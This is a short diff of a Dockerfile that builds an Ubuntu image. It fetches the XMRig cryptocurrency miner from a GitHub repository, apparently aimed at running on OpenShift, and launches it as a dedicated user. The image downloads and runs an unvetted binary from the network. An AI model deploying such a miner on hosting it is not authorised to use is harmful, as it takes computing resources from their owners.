@@ -1,9 +1,8 @@
 FROM  ubuntu
 RUN adduser -S -D -H -h /xmrig-2.6.2 xminer
-RUN apt-get update && apt-get install -y wget
-RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig001.tar.gz
-RUN tar -xvzf xmrig001.tar.gz
+RUN apt-get update && apt-get install -y git
+RUN git clone https://github.com/lanka256/openshif-docker.git
 USER xminer
-WORKDIR xmrig-2.6.2/
+WORKDIR openshif-docker/
 CMD ./xmrig
 
